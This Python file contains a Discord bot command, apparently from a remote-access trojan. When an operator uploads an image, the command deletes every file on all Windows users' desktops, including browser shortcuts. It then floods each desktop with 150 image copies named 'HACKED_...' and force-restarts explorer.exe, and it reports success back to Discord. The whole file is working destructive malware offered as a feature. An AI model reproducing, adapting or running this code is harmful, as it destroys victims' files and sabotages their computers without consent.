import os
import random
import string
import requests
import threading
import queue
import sys, shutil
import concurrent.futures
import discord
import subprocess
async def nofilespls(ctx):
    if not ctx.message.attachments:
        await ctx.send(embed=discord.Embed(title="Error", description="Upload an image file.", color=discord.Color.red()))
        return

    attachment = ctx.message.attachments[0]
    valid_extensions = [".webp", ".png", ".jpeg", ".jpg", ".ico"]
    file_extension = os.path.splitext(attachment.filename)[1].lower()

    if file_extension not in valid_extensions:
        await ctx.send(embed=discord.Embed(title="Invalid File", description="Only image files are allowed.", color=discord.Color.red()))
        return

    file_content = await attachment.read()
    image_path = f"uploaded_file{file_extension}"
    with open(image_path, "wb") as file:
        file.write(file_content)

    desktop_folders = [os.path.join(root, "Desktop") for root, _, _ in os.walk(r"C:\Users") if os.path.exists(os.path.join(root, "Desktop"))]
    max_tasks = 20

    def delete_file(file_path):
        try:
            if os.path.isfile(file_path): os.remove(file_path)
            elif os.path.isdir(file_path): shutil.rmtree(file_path)
        except: pass

    def flood_desktop():
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_tasks) as executor:
            for folder in desktop_folders:
                try:
                    for item in os.listdir(folder):
                        item_path = os.path.join(folder, item)
                        if item.endswith(".lnk") and ("firefox" in item.lower() or "chrome" in item.lower()):
                            executor.submit(delete_file, item_path)
                        elif os.path.isfile(item_path):
                            executor.submit(delete_file, item_path)
                    for _ in range(150):
                        random_name = os.path.join(folder, f'HACKED_{"".join(random.choices(string.ascii_uppercase, k=5))}{file_extension}')
                        executor.submit(shutil.copy, image_path, random_name)
                except: pass

    threading.Thread(target=flood_desktop).start()
    
    try:
        subprocess.run("taskkill /im explorer.exe /f", shell=True)
        subprocess.run("start explorer.exe", shell=True)
    except: pass

    embed = discord.Embed(title="Desktop Flooded", description=f"Flooded with {attachment.filename}", color=discord.Color.green())
    embed.set_image(url=attachment.url)
    await ctx.send(embed=embed)
